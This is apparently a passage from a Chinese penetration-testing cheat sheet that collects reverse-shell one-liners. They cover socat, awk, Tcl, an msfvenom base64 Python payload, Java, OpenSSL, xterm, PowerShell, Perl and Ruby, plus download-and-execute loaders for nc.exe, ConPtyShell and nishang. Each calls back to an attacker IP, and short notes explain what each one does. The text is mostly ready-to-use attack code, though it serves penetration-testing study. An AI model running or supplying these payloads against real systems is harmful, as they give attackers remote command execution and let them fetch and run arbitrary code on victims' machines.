目标机主动连接攻击机
```
socat tcp-connect:192.168.32.130:9999 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
> 这是一段使用 socat 的命令，它将创建一个 TCP 连接到 IP 为 192.168.32.130，端口为 9999 的主机。然后它执行一个带有参数的 bash 脚本，并且通过 pty、stderr、setsid、sigint 和 sane 等参数来设置这个 shell 的环境。
![image-20220728105520220](../../.gitbook/assets/image-20220728105520220.png)
### awk反弹
```
awk 'BEGIN {s = "/inet/tcp/0/192.168.32.130/7777"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
> 这是一个使用awk脚本连接到远程主机并执行命令的代码片段。它连接到 IP 地址为192.168.32.130，端口为 7777 的远程主机，并在连接成功后不断循环，输出 "shell>" 提示符并等待输入，一旦收到输入，就将其发送到远程主机并打印任何输出。如果输入的是 "exit"，则关闭连接并退出循环。
![]()
### TCL脚本反弹shell
```
echo 'set s [socket 192.168.32.130 7777];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
```
> 这是一段使用 Tcl 语言的代码，它会连接到 IP 地址为 192.168.32.130，端口为 7777 的主机。当连接成功后，它会不断输出 "shell>"，读取远程主机的输入并执行命令。每当执行完一条命令后，它会将结果再发送回远程主机，并再次读取命令。当远程主机输入 "exit" 时，它会关闭连接并结束执行。
![]()
### msfvenom
我们直接可以使用 `msfvenom -l` 结合关键字过滤（如cmd/unix/reverse），列出我们需要生成的各类反弹shell一句话的payload：
```
msfvenom -l payloads | grep 'cmd/unix/reverse'
```
![]()
如上图所示，metasploit支持生成反弹shell一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：
```
┌──(root💀kali)-[~]
└─# msfvenom -p cmd/unix/reverse_python LHOST=192.168.32.130 LPORT=7777 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 617 bytes
python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAgICxzdWJwcm9jZXNzICAgICAgICAgLG9zICAgICAgICA7ICAgIGhvc3Q9IjE5Mi4xNjguMzIuMTMwIiAgICAgICAgOyAgICBwb3J0PTc3NzcgICAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICAgICAgLHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICAgIDsgICAgcy5jb25uZWN0KChob3N0ICAgICAgICAgLHBvcnQpKSAgICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICAsMCkgICAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAgLDEpICAgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwyKSAgICAgICAgOyAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=')[0]))"
```
将生成的python反弹shell的一句话在目标主机上执行即可：
![]()
### Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.32.130/4444;cat &5 >&5; done"] as String[])
p.waitFor()
```
> 这是一段 Java 代码，通过使用 Runtime 类的 exec 方法来执行一个命令。该命令使用 /bin/bash 进行交互，并打开一个 TCP 连接到 192.168.32.130 的 4444端口。从该连接读取的每一行都会被执行，其结果将通过连接写回。该代码使用 waitFor 方法来等待命令完成。
### OpenSSL反弹加密
在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：
```
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```
假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 7777端口：
```
openssl s_server -quiet -key key.pem -cert cert.pem -port 7777
```
此时 OpenSSL 便在攻击机的 7777端口上启动了一个 SSL/TLS server。
这时在目标机进行反弹 shell 操作，命令为：
```
mkfifo /tmp/s; /bin/sh -i &1 | openssl s_client -quiet -connect 192.168.32.130:7777 > /tmp/s; rm /tmp/s
```
![]()
### XTERM
```
# Start an open X Server on your system (:1 – which listens on TCP port 6001)
apt-get install xnest
Xnest :1
# Then remember to authorise on your system the target IP to connect to you
xterm -display 127.0.0.1:1
# Run this INSIDE the spawned xterm on the open X Server
xhost +targetip
# Then on the target connect back to the your X Server
xterm -display attackerip:1
/usr/openwin/bin/xterm -display attackerip:1
or
$ DISPLAY=attackerip:0 xterm
```
> 这是一种利用X Server漏洞的攻击方法，攻击者会安装Xnest并打开一个X Server监听在TCP端口6001，然后在本地打开一个xterm授权目标IP连接，然后目标机在X Server上运行xterm，连接回攻击者的X Server，进而执行恶意命令。
## Windows
### powershell反弹
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.32.130",7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
> 这是一段使用 PowerShell 脚本连接到 IP 地址为 192.168.32.130，端口为 7777 的目标主机并执行命令的代码。 它创建一个 TCP 客户端连接到目标主机，并通过该连接获取流数据。然后，通过循环读取流中的数据并执行命令，将结果发送回流中。最后关闭 TCP 客户端连接。
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.32.130',7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
> 这是一段 PowerShell 脚本，作用是创建一个 TCP 客户端连接到 IP 为 192.168.32.130，端口为 7777 的服务器。该客户端循环读取从服务器发送的数据，并将其作为 PowerShell 命令进行执行，将执行结果再发送回服务器。该脚本运行结束后关闭客户端连接。
```
$socket = new-object System.Net.Sockets.TcpClient('192.168.32.130', 1234);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
	$writer.Write("> ");
	$writer.Flush();
	$read = $null;
	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}	
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$out = $out.split(' ')
	        $res = [string](&$out[0] $out[1..$out.length]);
		if($res -ne $null){ $writer.WriteLine($res)}
	}
}While (!$out.equals("exit"))
$writer.close();$socket.close();
```
> 这是一段 PowerShell 脚本，它创建一个 TCP 客户端，连接到 IP 为 192.168.32.130，端口为 1234 的服务器。脚本执行以下操作：
>
> 1. 如果客户端创建失败，则退出脚本。
> 2. 创建一个字节数组用于存储从服务器读取的数据。
> 3. 创建一个 ASCII 编码的对象，用于将读取的字节数据转换为字符串。
> 4. 循环从服务器读取数据，并将读取的字符串作为 PowerShell 命令执行，将执行结果写回服务器。当读取的字符串为 "exit" 时，退出循环。
> 5. 关闭客户端连接。
```
$pass = ConvertTo-SecureString 'password' -AsPlainText -Force;
$cred = New-Object System.Management.Automation.PSCredential('sectest\hack', $pass);
Invoke-Command -Computer Fidelity -Credential $cred -ScriptBlock { powershell.exe -c 'IWR -uri http://192.168.32.130:8000/nc.exe -o C:\temp\nc.exe'};
Invoke-Command -Computer Fidelity -Credential $cred -ScriptBlock { cmd.exe '/c C:\temp\nc.exe 10.10.16.2 7777 -e cmd.exe'}
```
> 这是一段 PowerShell 脚本，它创建了一个认证凭证对象，用于连接到名为 "sectest\hack" 的用户，并使用 "password" 作为密码。 然后，使用 Invoke-Command 命令在远程计算机 "Fidelity" 上执行两个命令：
>
> 1. 使用 IWR 命令从 http://192.168.32.130:8000/nc.exe 下载文件到 C:\temp\nc.exe。
> 2. 使用 cmd.exe 运行 C:\temp\nc.exe，并执行从 10.10.16.2 的 7777 端口连接到本地 cmd.exe 的命令。
>
> 注意：在执行此脚本前，请确保您有使用 Invoke-Command 命令的权限，并且可以访问远程计算机 "Fidelity"。
### perl反弹
```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"192.168.32.130:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
> 这是一段Perl代码，它创建了一个IO::Socket::INET对象，连接到IP地址为192.168.32.130，端口为443的主机。然后它通过标准输入（STDIN）与标准输出（$~）关联了套接字的读取和写入。最后，它使用system函数一直读取输入，并在读取到输入时执行命令。
### ruby反弹
```
ruby -rsocket -e 'c=TCPSocket.new("192.168.32.130","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
> 这是一段Ruby代码，它创建了一个TCPSocket对象，连接到IP地址为192.168.32.130，端口为4444的主机。它进入一个循环，每次从套接字中读取命令（cmd），然后使用IO.popen执行该命令，并读取输出。最后，它通过套接字将读取的输出发送回主机。
### ConPtyShell
ConPtyShell 是适用于 Windows 系统的完全交互式反向 Shell。
> 要求：客户端：Windows 版本 >= 10 / 2019 1809（内部版本 >= 10.0.17763）
kali
```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```
受害机
```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```
![image-20220728113134487](../../.gitbook/assets/image-20220728113134487.png)
![image-20220728113154308](../../.gitbook/assets/image-20220728113154308.png)
### nishang
```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.32.130 -port 4444
```
> 这是一段 PowerShell 代码，它的作用是从 GitHub 下载一个名为 Invoke-PowerShellTcp.ps1 的脚本并执行，并通过反向连接的方式连接到 IP 地址为 192.168.32.130，端口为 4444 的主机。